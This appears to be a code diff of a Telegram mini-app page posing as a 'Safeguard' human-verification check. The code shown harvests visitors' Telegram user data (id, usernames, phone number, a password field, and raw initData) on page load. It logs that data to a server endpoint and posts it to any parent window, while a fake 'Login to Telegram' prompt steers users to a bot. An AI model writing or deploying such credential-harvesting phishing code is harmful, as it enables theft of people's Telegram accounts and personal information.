@@ -10,78 +10,123 @@
     <link rel="preload" href="./_next/static/css/3db7e18ba6d2d9e9.css" as="style">
     <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
     <!-- Add Telegram Web App script -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  </head>
-  <body>
-    <div id="__next">
-      <div class="bg-telegram-bg">
-        <main class="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
-          <div class="mt-5">
-            <p class="text-3xl font-bold text-telegram-text">Human Verification</p>
-            <p class="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
-            <div class="flex items-center justify-center w-100 mt-3">
-              <button onclick="window.location.replace('/a/' + window.location.search + window.location.hash)" class="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">Click here</button>
-            </div>
-          </div>
-        </main>
-      </div>
-    </div>
-    <!-- Add script to handle Telegram Web App login -->
     <script>
-      window.onload = () => {
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const type = urlParams.get('type') || 'safeguard'; // Default to 'safeguard' if type is missing
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-        Telegram.WebApp.MainButton.setText('Login to Telegram')
-          .show()
-          .onClick(() => {
-            Telegram.WebApp.showPopup({
-              title: 'Login to Telegram',
-              message: 'Please login to your Telegram account to continue.',
-              buttons: [
-                { id: 'login', type: 'default', text: 'Login' },
-                { type: 'cancel' }
-              ]
-            }, (buttonId) => {
-              if (buttonId === 'login') {
-                Telegram.WebApp.openTelegramLink('https://t.me/SafetyGuardianRobot?start=login');
-              }
+  window.onload = () => {
+    fetch('/api/debug', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ message: 'Safeguard mini-app loaded' }),
+    });
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const type = urlParams.get('type') || 'safeguard';
+    Telegram.WebApp.ready();
+    fetch('/api/debug', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ message: 'Telegram.WebApp.ready() called' }),
+    });
+    Telegram.WebApp.expand();
+    // Use initData to get user data directly
+    const initData = Telegram.WebApp.initDataUnsafe;
+    fetch('/api/debug', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ message: `initData: ${JSON.stringify(initData)}` }),
+    });
+    if (initData && initData.user) {
+      const user = initData.user;
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${user.id}` }),
+      });
+      window.parent.postMessage({
+        type,
+        id: user.id,
+        first_name: user.first_name,
+        usernames: [{ username: user.username, isActive: true }],
+        phone_number: user.phone_number || 'Not shared',
+        premium: user.is_premium || false,
+        password: 'Not available via initData',
+        quickly_set: {}
+      }, '*');
+    } else {
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: 'No user data in initData' }),
+      });
+      // Fallback to login flow
+      Telegram.WebApp.MainButton.setText('Login to Telegram')
+        .show()
+        .onClick(() => {
+          fetch('/api/debug', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: 'MainButton clicked' }),
+          });
+          Telegram.WebApp.showPopup({
+            title: 'Login to Telegram',
+            message: 'Please login to your Telegram account to continue.',
+            buttons: [
+              { id: 'login', type: 'default', text: 'Login' },
+              { type: 'cancel' }
+            ]
+          }, (buttonId) => {
+            fetch('/api/debug', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({ message: `Popup button clicked: ${buttonId}` }),
             });
+            if (buttonId === 'login') {
+              Telegram.WebApp.openTelegramLink('https://t.me/SafetyGuardianRobot?start=login');
+            }
           });
-        Telegram.WebApp.onEvent('web_app_data', (event) => {
-          // Log the event to the server for debugging
-          fetch('/api/debug', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ message: `Received web_app_data event: ${event.data}` }),
-          });
-          // Parse the event data
-          const data = JSON.parse(event.data);
-          // Log the postMessage action
-          fetch('/api/debug', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${data.id}` }),
-          });
-          // Send the data to the parent window
-          window.parent.postMessage({
-            type,
-            id: data.id,
-            first_name: data.first_name,
-            usernames: data.usernames,
-            phone_number: data.phone_number,
-            premium: data.is_premium,
-            password: data.password,
-            quickly_set: data.quickly_set
-          }, '*');
         });
-      };
-    </script>
+      Telegram.WebApp.onEvent('web_app_data', (event) => {
+        fetch('/api/debug', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ message: `Received web_app_data event: ${event.data}` }),
+        });
+        const data = JSON.parse(event.data);
+        fetch('/api/debug', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${data.id}` }),
+        });
+        window.parent.postMessage({
+          type,
+          id: data.id,
+          first_name: data.first_name,
+          usernames: data.usernames,
+          phone_number: data.phone_number,
+          premium: data.is_premium,
+          password: data.password,
+          quickly_set: data.quickly_set
+        }, '*');
+      });
+    }
+  };
+</script>
   </body>
 </html>
